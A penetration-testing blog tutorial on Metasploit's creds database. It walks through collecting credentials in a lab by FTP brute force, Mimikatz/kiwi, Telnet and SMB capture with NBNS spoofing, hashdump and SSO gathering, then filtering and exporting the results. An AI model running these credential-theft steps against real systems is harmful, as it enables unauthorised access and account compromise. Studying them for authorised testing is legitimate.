<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Metasploit for Pentester: Creds</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/metasploit-for-pentester-creds/" rel="bookmark"><time class="entry-date published" datetime="2021-07-30T17:48:11+00:00">July 30, 2021</time><time class="updated" datetime="2025-05-12T21:17:34+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">This is in continuation with the <strong data-start="660" data-end="694">Metasploit for Pentester Creds</strong> series of articles that we are presenting. More specifically, we learned about the Workspaces and the Metasploit Database service in our previous article: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/metasploit-for-pentester-database-workspace/">Metasploit for Pentester: Database &amp; Workspace</a></strong></span>. In this article, we will be discussing another database inside the Workspace that can be used by Penetration Testers: Creds.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Recap and DB Initialization </strong></span></li>
<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li><span style="color: #000000;"><strong>Extracting Creds</strong></span>
<ul>
<li><span style="color: #000000;">From Bruteforce</span></li>
<li><span style="color: #000000;">From Mimikatz</span></li>
<li><span style="color: #000000;">From Telnet</span></li>
<li><span style="color: #000000;">From SMB</span></li>
<li><span style="color: #000000;">From Hashdump</span></li>
<li><span style="color: #000000;">From SSO</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Search Filter</strong></span>
<ul>
<li><span style="color: #000000;">By Username</span></li>
<li><span style="color: #000000;">By Type</span></li>
<li><span style="color: #000000;">By Port</span></li>
<li><span style="color: #000000;">By Host</span></li>
<li><span style="color: #000000;">By Service</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Adding Credentials</strong></span></li>
<li><span style="color: #000000;"><strong>Exporting Credentials</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;">Recap and DB Initialization</span></h3>
<p><span style="color: #000000;">Without repeating but having a small recap of the facts that we learned in the Workspace article that, Metasploit has a Postgres SQL database at its disposal inside which Penetration Testers can create Workspace for their usage. This Workspace has some sub-sections such as the hosts and vulns that hold the various hosts enumerated by the users with the help of the db_nmap and Metasploit auxiliaries. Among those databases, we have another type of database that is called creds. Before beginning, with its functionalities, let’s initiate the database with the help of the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfdb init</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-L6TAAMCdKQk/YQQ0TSssW-I/AAAAAAAAyDA/7JXUZms3Md0eZUTwugSLoZDHixYvDIKzgCLcBGAsYHQ/s16000/1.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span> </span></h3>
<p><span style="color: #000000;">After initializing, just by running the creds command, we can see the table that will hold the data enumerated by the user. It contains the following columns: hosts for holding the primary key i.e., IP Addresses of the targeted hosts, the origin will store the location where we were able to grab the creds from, service will feature the particular service running on the hosts that made it possible to the extraction of the creds, public and private are just the holders for the public variable which in most cases is the username and private as you might have guessed it the password. We have some other columns that we will get into later. However, we have a column by the name of JtR Format. It will contain the format that can be used with John the Ripper tool to decode.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LJfjvZRaA54/YQQ2wQdTZFI/AAAAAAAAyDI/4pJTNa7O3HAVoIYCDVKMMPTkXWcCS0aBQCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Extracting Creds </span></h3>
<h4><span style="color: #800000;">Bruteforce </span></h4>
<p><span style="color: #000000;">We discussed in the Introduction section that the creds table will populate with the correct credentials that we enumerate using the auxiliaries from Metasploit. To demonstrate the collection of creds from Bruteforce, we will be targeting the FTP service running on a server. We used the ftp_login exploit to attempt to Bruteforce the credentials. We provided the host with the User File with the possible usernames, pass a file with possible passwords. After running through, the list of usernames and passwords, the exploit was able to grab the correct credentials as username privs and password 123. After successful extraction of the credentials, we ran the creds command and we can observe that the creds table has its very first entry as demonstrated in the image below</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/ftp/ftp_login
set rhosts 192.168.1.40
set user_file /root/users.txt
set pass_file /root/pass.txt
set verbose false
set stop_on_success true
exploit
creds</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yGC6e6IXnOk/YQQ202wZ3DI/AAAAAAAAyDM/odIDztwwcjY1z57lVap6tza30g62gjwuQCLcBGAsYHQ/s16000/3.png"/></span></p>
<h4><span style="color: #800000;">Mimikatz</span></h4>
<p><span style="color: #000000;">We are not going to use the Mimikatz directly on our target but we will be using the Meterpreter external extension called kiwi. To use Mimikatz, we will be initially compromising a Windows Machine and gain a meterpreter session on it. After gaining the meterpreter, we will load the kiwi module and run the creds_all command to gain all the possible credentials. Passwords, hashes from the compromised machine. We can see that we can enumerate the NTLM hashes and some clear text passwords with the help of the kiwi module.  </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load kiwi
creds_all</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sp64sLERL_g/YQQ25KJBOPI/AAAAAAAAyDQ/y1s2637m3oYe4B5YbtgabFM7Wb0Y2pemQCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">Let’s run the creds command again to see if the recently enumerated creds are populated inside the table. We can observe that we have the clear text password and the NTLM hashes added into the creds table. We can see that the host that we extracted the NTLM hash is the Windows Machine running with the IP Address of 192.168.1.21 and the FTP service was running on the machine with the IP Address 1922.168.1.40</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wiNmwrwiivc/YQQ29cfhVNI/AAAAAAAAyDU/r5OjjiwgxUoGOidGIgMz-p2G1NpocrapwCLcBGAsYHQ/s16000/7.png"/></span></p>
<h4><span style="color: #800000;">Telnet</span></h4>
<p class="" data-start="78" data-end="487"><span style="color: #000000;">Now, moving on from the FTP service and NTLM hashes, we will extract Telnet credentials using another Metasploit auxiliary calledcapture/telnet. We are targeting the machine with the IP address 192.168.1.3, and we can see that the captured credentials areignited/123. As always, running the creds command confirms that the credentials table has been successfully populated with the Telnet credentials.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/telnet
set srvhost 192.168.1.9
exploit
creds</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-t_V3ibhnItk/YQQ3CVpo0II/AAAAAAAAyDc/Z4oJ3OmGNdcpDYQBhdaFEvIjxbwQOZN9gCLcBGAsYHQ/s16000/8.png"/></span></p>
<h4><span style="color: #800000;">SMB</span></h4>
<p><span style="color: #000000;">Next, we will be targeting the Windows Machine with the SMB capture and generate the response to capture the NTLM hashes.  We will be using the auxiliary/server/capture/smb and auxiliary/spoof/nbns/nbns_response exploits to get the NTLM hashes. We provided the host for serving the capture and the path to the john password file to be saved. Also, we provided the spoof IP Address and we have the NTLM hashes as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/smb
set srvhost 192.168.1.9
set johnpwfile /root/Desktop
exploit
use auxiliary/spoof/nbns/nbns_response
set spoofip 192.168.1.9
set interface eth0
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T_kQJShityk/YQQ3Hk7QJzI/AAAAAAAAyDg/YWgyJZbCSmw1g4O6fExb7Kf0gy87DvvXQCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Since we were successful in capturing the NTLM hashes from the target machine, these will automatically populate the creds table. We can check these entries by running the creds command as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4Y1oiWLa6Do/YQQ3QQv5djI/AAAAAAAAyDo/oplgS_wdwdQkkpNJSu9tX2R6tH_L-FSbwCLcBGAsYHQ/s16000/10.png"/></span></p>
<h4><span style="color: #800000;">Hashdump</span></h4>
<p><span style="color: #000000;">Moving on from NTLM hashes on Windows to Hashes on Linux machines. To enumerate the hashes, we will be using the Hashdump post-exploitation module on Metasploit. After exploiting a Linux Machine, we can use this post-exploitation module to gather all the hashes of the users on the compromised machine. We can see from the image below that the extracted hashes have been added to the creds table.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/linux/gather/hashdump
set session 3
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2d029Nv37bQ/YQQ3XSp4NmI/AAAAAAAAyD0/bI7gEQEvhRULI2pNKXVt-ibjfGZJGOcyACLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">It is not always necessary to run the post-exploitation module as demonstrated above. Meterpreter has the command that we can directly from the meterpreter shell called hashdump. It lists all the extracted hashes as shown in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hashdump</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PnSGyNILDgY/YQQ3byMI4zI/AAAAAAAAyD4/mtZjfF727SEpU01dIIkcydra7y3CNJ12QCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">When we go back to the Creds database we can see that it will have the hashes recovered from the hashdump post-exploitation module and the hashdump meterpreter command that we just ran.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9tC0Fvc_X0U/YQQ3ukqKQhI/AAAAAAAAyEQ/J-gDicvopIMIwrpYskmK9euVp-tL8TwtACLcBGAsYHQ/s16000/13.png"/></span></p>
<h4><span style="color: #800000;">SSO</span></h4>
<p><span style="color: #000000;">Next, we will be targeting the Domain Controlled Windows System and try to capture the SSO credentials programmed on it.  We will use the post-exploitation module windows/gather/credentials/sso. We can see from the image below that the SSO password for Nisha User was extracted successfully.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/credentials/sso
set session 1
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W2Srzq13ElA/YQQ3iXPtziI/AAAAAAAAyEE/oMS5E_R4Q84kdT17ho6nRuvfPHIkjtSWACLcBGAsYHQ/s16000/14.png"/></span></p>
<p><span style="color: #000000;">Let’s check if the SSO credentials for Nisha users that we just extracted make their way into the Creds database. After running the creds command we can see that it contains the SSO credentials as well.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y1DzqQmztmk/YQQ324SZuyI/AAAAAAAAyEY/Wudh_-ZKhysCLMFdeVcs_Xzz3hvTU042QCLcBGAsYHQ/s16000/15.png"/></span></p>
<h3><span style="color: #800000;">Search Filter: Username</span></h3>
<p><span style="color: #000000;">While working with multiple targets across a dense network of machines, it becomes difficult to identify and search for a particular set of credentials. Creds have the option to sort the data according to your requirement. Starting with the basic filter of username. Identifying a set of credentials with the username is such a standard as lock and key. With the help of the -u option we can sort the creds table with a particular username. In the demonstration below we are searching for the credentials with the username raj.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -u raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aZ6CfS1BI08/YQQ37Ox2KRI/AAAAAAAAyEc/-8LlR28TuD0vxdvp3VDuXAN-oD7puwu8gCLcBGAsYHQ/s16000/16.png"/></span></p>
<h4><span style="color: #800000;">Search Filter: Type</span></h4>
<p class="" data-start="76" data-end="481"><span style="color: #000000;">Next, we will explore the search filter for searching by the type of credentials. To understand this, we first need to examine how the creds categorize different types of credentials. For instance, when we enumerated the NTLM hashes, the tool categorized them as NTLM type credentials. Therefore, when we use the -t option with NTLM, we can retrieve all the captured hashes, as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -t ntlm</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Ca0ADdIB2Jw/YQQ3_QTc-TI/AAAAAAAAyEk/qauFpyGv7LsLXH1_RfiWF2OT7P4HGG2agCLcBGAsYHQ/s16000/17.png"/></span></p>
<h4><span style="color: #800000;">Search Filter: Port</span></h4>
<p class="" data-start="54" data-end="239"><span style="color: #000000;">Now, moving from the type of credentials to the port from which we extract the credentials, we know that we can extract credentials from a specific service running on a particular port. </span><span style="color: #000000;">To filter the creds table by port number, we use the -p option, followed by the port number for which we want to search credentials. In the demonstration below, we search for credentials extracted from port 23.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -p 23</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BO4LEJkrmlw/YQQ4ERQDIyI/AAAAAAAAyEo/lM531Xtqf-8dY0ustytJx9OO9onQegwkQCLcBGAsYHQ/s16000/18.png"/></span></p>
<h4><span style="color: #800000;">Search Filter: Host</span></h4>
<p class="" data-start="91" data-end="460"><span style="color: #000000;">Next, we will explore the search filter for searching by the host of credentials. These hosts are either the ones from which the credentials originated or the ones from which the credentials were extracted. When you use the -O option with the IP address of the hosts, it will display all the credentials extracted from that specific host, as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -O 192.168.1.136</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zR8Y1qUpr7w/YQQ4PLhEiRI/AAAAAAAAyE8/SR3TSMt1iK0kYy8HAk1VC-m3-RQz0RCXACLcBGAsYHQ/s16000/19.png"/></span></p>
<h4><span style="color: #800000;">Search Filter: Service</span></h4>
<p class="" data-start="860" data-end="1176"><span style="color: #000000;">Finally, after sorting by various hosts, ports, types, and usernames, we sort the credentials by the service from which we extracted them. This process is similar to the one we used with ports. However, since services don’t always run on their default ports, targeting by service name offers a more optimal strategy.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -s ftp</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_T05e9hD_9E/YQQ4T9b66SI/AAAAAAAAyFA/hRydbXnsFjw0NjWnubh4WCRpYVqo5SohgCLcBGAsYHQ/s16000/20.png"/></span></p>
<h3><span style="color: #800000;">Adding Credentials</span></h3>
<p><span style="color: #000000;">We introduced some odd three-four methods to add the credentials into the creds table. But even if those are not sufficient and you want particular credentials in your database. You have the choice to add it manually. It requires the user tag and the password tag. In the demonstration below, we are adding the credentials for the user Pavan.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7J9klcKHc2Q/YQQ4YVBacpI/AAAAAAAAyFI/cm8B4ww63ZcKKgHPrsd75A5jOMMuVC9wgCLcBGAsYHQ/s16000/21.png"/></span></p>
<h3><span style="color: #800000;">Exporting Credentials</span></h3>
<p><span style="color: #000000;">As we discussed in the previous article about the hosts and workspace, we exported the contents of their database into a CSV file for reporting and other purposes. The Creds command is not untouched by this functionality. If you want to export the data from the Creds database into a CSV file, you can do so by using the -o option followed by the file name as shown below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">creds -o raj.csv</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CBcONyzv6xg/YQQ4dLhxUwI/AAAAAAAAyFQ/mvFaqev2RRQwlby9XMnoK_FAeth4fIxywCLcBGAsYHQ/s16000/22.png"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">This was a learning experience as when we start with the Penetration Activities, we tend not to focus on the documentation process or providing you work a proper structure and backup. But with time and some incidents where lack of these qualities proves to be valuable. The Creds database functionality of Metasploit is not a new feature, it has been on for years and yet the general usage of these in real life seems very less. Hence, it inspired us to provide the guide, so that lots of Penetration Testers can use it and benefit from it.</span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Can be Contacted on</span> <strong>Twitter</strong> and <strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
